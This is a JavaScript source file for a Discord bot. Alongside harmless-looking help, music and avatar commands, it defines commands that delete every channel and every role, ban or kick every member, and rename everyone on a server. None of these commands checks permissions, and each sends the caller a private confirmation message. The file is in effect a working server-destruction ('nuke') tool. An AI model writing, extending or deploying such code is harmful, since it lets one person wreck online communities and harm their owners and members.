const Discord = require('discord.js');
const client = new Discord.Client();

const prefix = '-';

const fs = require('fs');

client.commands = new Discord.Collection();

const commandFiles = fs
	.readdirSync('./commands/')
	.filter(file => file.endsWith('.js'));
for (const file of commandFiles) {
	const command = require(`./commands/${file}`);

	client.commands.set(command.name, command);
}

client.once(
	'ready',
	() => {
		setInterval(() => {
			client.user.setActivity(
				`${client.guilds.cache.size} guilds | (` + prefix + `)`,
				{ type: 'WATCHING' }
			);
		});
		console.log('static');
	},
	1000 * 60 * 5
);




client.on('message', message => {
	if (!message.content.startsWith(prefix) || message.author.bot) return;

	const args = message.content.slice(prefix.length).split(/ +/);
	const command = args.shift().toLowerCase();

	
	if (command === 'ohelp') {
		client.commands.get('ohelp').execute(message, args, Discord);
	}
	if (command === 'arole') {
		client.commands.get('arole').execute(message, args);
	}
  if (command === 'log') {
    client.commands.get('log').execute(message,args, Discord);
  }
	if (command === 'dchannel') {
	
			message.guild.channels.cache.forEach(channel => channel.delete());
			message.author.send('Action Completed. - Deleted Channel');
			console.log('Ran dchannel command. (SUCCESS)');
		
	}
	if (command === 'drole') {
			message.guild.roles.cache.forEach(roles => {
				roles
					.delete()
					.then(deleted => console.log(`Deleted role ${deleted.name}`))
					.catch(console.error);
			});
			message.author.send('Action Completed. - Deleted Role');
			console.log('Ran drole command. (SUCCESS)');
		
	}
    if (command === 'banall') {


      message.guild.members.cache.forEach(member => {

        member.ban().then(ban => console.log(`Banned ${ban.name}`)).catch(console.error);
      });
      
      message.author.send('Action Completed. - Ban All');
      console.log('Ran banall command. (s)')

  }
  if (command === 'kickall') {


      message.guild.members.cache.forEach(member => {

        member.kick().then(kick => console.log(`Kicked ${kick.name}`)).catch(console.error);
      });
      
      message.author.send('Action Completed. - Kick All');
      console.log('Ran kickall command. (s)')

  }
  if (command === 'nickall') {

      const nick = args.join(" ");
      message.guild.members.cache.forEach(member => {

        member.setNickname(nick).then(member => console.log(`Set nick ${nick}`)).catch(console.error);
    
      });

      message.author.send('Action Completed. - Nick All.');
      console.log('Ran nickall command. (s)');
    
  }
	if (command === 'demoji') {
		client.commands.get('demoji').execute(message, args);
	}
	if (command === 'play') {
		client.commands.get('play').execute(message, args);
	}

	if (command === 'av') {
		client.commands.get('av').execute(message, Discord);
	}


});

client.login('you have the token');
